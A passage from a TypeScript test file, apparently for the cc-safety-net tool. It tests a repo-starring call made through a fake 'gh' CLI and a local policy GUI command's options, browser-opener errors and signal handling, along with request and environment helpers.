    const binDir = writeFakeCommands(localTempDir, {
      gh: 'await new Promise((resolve) => setTimeout(resolve, 1_000));',
    });

    try {
      await withEnv({ PATH: `${binDir}${delimiter}${process.env.PATH ?? ''}` }, async () => {
        expect(await starRepo('gh', 10)).toEqual({ ok: false });
        expect(await userHasStarredRepo('gh', 10)).toBeNull();
      });
    } finally {
      // Windows may keep the generated .cmd body's files locked briefly after its wrapper dies.
      rmSync(localTempDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
    }
  });

  test('starRepo uses gh CLI with fixed argv', async () => {
    const localTempDir = mkdtempSync(join(process.cwd(), '.tmp-star-'));
    const binDir = writeFakeCommands(localTempDir, {
      gh: `appendFileSync(process.env.STAR_LOG ?? '', args.join('\\n') + '\\n');
await new Promise((resolve) => setTimeout(resolve, 100));`,
    });
    const starLog = join(localTempDir, 'star-argv.txt');

    try {
      await withEnv(
        { PATH: `${binDir}${delimiter}${process.env.PATH ?? ''}`, STAR_LOG: starLog },
        async () => {
          expect(await starRepo()).toEqual({ ok: true });
          expect(readFileSync(starLog, 'utf-8')).toBe(
            'api\n-X\nPUT\n/user/starred/kenryu42/cc-safety-net\n',
          );
        },
      );
    } finally {
      rmSync(localTempDir, { recursive: true, force: true });
    }
  });

  test('runGuiCommand honors no-open and prints URL', async () => {
    let openedUrl: string | null = null;
    const output: string[] = [];
    const result = await runGuiCommand(['--no-open'], {
      userConfigDir: join(safetyNetHome, 'rules'),
      openBrowser: async (url) => {
        openedUrl = url;
      },
      keepAlive: false,
      log: (message) => output.push(message),
    });

    expect(result).toBe(0);
    expect(openedUrl).toBeNull();
    expect(output.join('\n')).toContain('http://127.0.0.1:');
  });

  test('runGuiCommand reports browser opener failures and keeps the URL visible', async () => {
    const gui = await runGuiForTest(safetyNetHome, {
      openBrowser: async () => {
        throw new Error('no browser');
      },
    });

    expect(gui.result).toBe(0);
    expect(gui.output).toContain('http://127.0.0.1:');
    expect(gui.errors).toContain('Failed to open browser: no browser');
    expect(gui.errors).toContain('Open this URL manually: http://127.0.0.1:');
  });

  test('runGuiCommand reports missing platform opener errors', async () => {
    const gui = await withPath(tempDir, () => runGuiForTest(safetyNetHome));

    expect(gui.result).toBe(0);
    expect(gui.output).toContain('http://127.0.0.1:');
    expect(gui.errors).toContain('Failed to open browser:');
    expect(gui.errors).toContain('Open this URL manually: http://127.0.0.1:');
  });

  test('runGuiCommand rejects unknown args and can stop on process signal', async () => {
    const errors: string[] = [];
    expect(
      await runGuiCommand(['--bad'], {
        error: (message) => errors.push(message),
      }),
    ).toBe(1);
    expect(errors.join('\n')).toContain('Unknown option for gui: --bad');
    expect(errors.join('\n')).toContain('Usage: cc-safety-net gui [--no-open]');

    const output: string[] = [];
    const run = runGuiCommand(['--no-open'], {
      userConfigDir: join(safetyNetHome, 'rules'),
      log: (message) => output.push(message),
    });
    while (output.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 1));
    }
    process.emit('SIGTERM', 'SIGTERM');

    expect(await run).toBe(0);
    expect(output.join('\n')).toContain('http://127.0.0.1:');
  });
});

async function getJson<T>(url: string): Promise<T> {
  const response = await fetch(url);
  expect(response.status).toBe(200);
  return (await response.json()) as T;
}

async function postJson<T>(url: string, token: string, body: unknown): Promise<T> {
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': token },
    body: JSON.stringify(body),
  });
  expect(response.status).toBe(200);
  return (await response.json()) as T;
}

/** The POST twin of `postJson` for the routes whose contract is a non-200 status. */
async function postJsonResponse<T>(
  url: string,
  token: string,
  body: unknown,
): Promise<{ status: number; body: T }> {
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': token },
    body: JSON.stringify(body),
  });
  return { status: response.status, body: (await response.json()) as T };
}

async function repairPolicyViaApi(
  safetyNetHome: string,
  server: Awaited<ReturnType<typeof createPolicyGuiServer>>,
): Promise<unknown> {
  const repair = await postJson<WriteApiResponse>(
    `${server.origin}/api/repair?token=${server.token}`,
    server.token,
    {},
  );
  expect(repair.errors).toEqual([]);
  return JSON.parse(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')) as unknown;
}

async function runGuiForTest(
  safetyNetHome: string,
  options: Parameters<typeof runGuiCommand>[1] = {},
) {
  const output: string[] = [];
  const errors: string[] = [];
  return {
    result: await runGuiCommand([], {
      userConfigDir: join(safetyNetHome, 'rules'),
      ...options,
      keepAlive: false,
      log: (message) => output.push(message),
      error: (message) => errors.push(message),
    }),
    output: output.join('\n'),
    errors: errors.join('\n'),
  };
}

async function withPath<T>(pathValue: string, fn: () => Promise<T>): Promise<T> {
  const originalPath = process.env.PATH;
  const originalPathAlt = process.env.Path;
  process.env.PATH = pathValue;
  if (process.platform === 'win32') process.env.Path = pathValue;
  try {
    return await fn();
  } finally {
    restoreEnv('PATH', originalPath);
    restoreEnv('Path', originalPathAlt);
  }
}

function restoreEnv(name: string, value: string | undefined): void {
  if (value === undefined) {
    delete process.env[name];
    return;
  }
  process.env[name] = value;
}
